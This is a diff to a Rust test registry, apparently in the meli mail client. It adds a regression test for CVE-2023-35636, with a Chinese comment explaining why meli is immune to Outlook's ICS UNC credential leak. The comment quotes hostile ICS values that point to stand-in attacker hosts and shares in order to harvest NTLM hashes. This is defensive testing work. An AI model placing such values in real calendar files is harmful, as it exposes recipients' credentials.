@@ -4125,3 +4125,36 @@ mod cve_2019_10741;
 #[cfg(test)]
 #[path = "CVE-2024-38173.rs"]
 mod cve_2024_38173;
+
+/// CVE-2023-35636（Microsoft Outlook 2016 / 2019 / LTSC / Microsoft 365 Apps
+/// for Enterprise，Windows；CVSS 3.1 6.5，CWE-200）Outlook ICS URL/LOCATION/
+/// DESCRIPTION UNC 凭据泄露回归（issue #132，表 2 of
+/// `SECURITY-CVE-RESEARCH.zh-CN.md` — credential theft）：邮件附件中的
+/// iCalendar 文件可指向任意 URL（含 Windows UNC `\\attacker\share`），受害者
+/// 打开日历条目时 Outlook 解析 ICS 并把引用交给系统处理器，向攻击者主机认证、
+/// 泄露 NTLMv2 哈希；与 CVE-2023-23397（ICS `VALARM ATTACH`）同族。issue 指定
+/// 的 `melib/src/utils/vobject/icalendar.rs` 攻击面经核实**不在邮件查看路径
+/// 上**：melib 的 vobject 模块只被 `contacts/card.rs::to_vcard_string` 的 vCard
+/// 导出使用，`meli/src/mail/view.rs` / `envelope.rs` / `types.rs` /
+/// `html_render.rs` 均不引用 `vobject`/`ICalendar`/`parse_component`/
+/// `icalendar`，`ICalendar`/`parse_component` 从 mail view 不可抵达。因此
+/// Windows SMB/NTLM 专属面在 meli 不存在，等价面映射为：**不透明附件展示**
+///（`text/calendar` 走 `Attachment::is_text` 的 InlineText 分支，解码字节逐字
+/// 展示、无属性提取 / 重写 / 解引用）、**URL 模式提取 + 启动门**
+///（`linkify` 只在 `://` 起链，UNC 反斜杠永不成链接；`file:`/`smb:` 可提取但
+/// [`is_default_launchable_scheme`] 只放行 http/https/mailto，全部落在
+/// `go_to_url` 确认门后；裸 UNC 无方案、不可自动启动）、**无外发认证通路**
+///（全仓无 SMB/NTLM 客户端依赖或实现，渲染面不发起网络/进程 I/O）。语料是一封
+/// 真实 `multipart/mixed` 攻击邮件（`text/plain` + `text/html` 镜像 +
+/// `text/calendar; method=REQUEST` 附件），ICS 逐字携带
+/// `URL:file://attacker/share`、`URL:\\attacker.example\share`、
+/// `ATTACH;VALUE=URI:http://attacker/`、
+/// `X-MICROSOFT-CDO-URL:\\attacker.example\\share\\leak`、`LOCATION` 与
+/// `DESCRIPTION`（内嵌 UNC / `file:` 文本）及良性 `https` 对照。逐层断言结局为
+/// **免疫证明，未发现缺口，未改动生产代码**；交互级发射点由仓内孪生单测
+/// `meli/src/mail/view/tests.rs` 锁定。
+///
+/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
+#[cfg(test)]
+#[path = "CVE-2023-35636.rs"]
+mod cve_2023_35636;
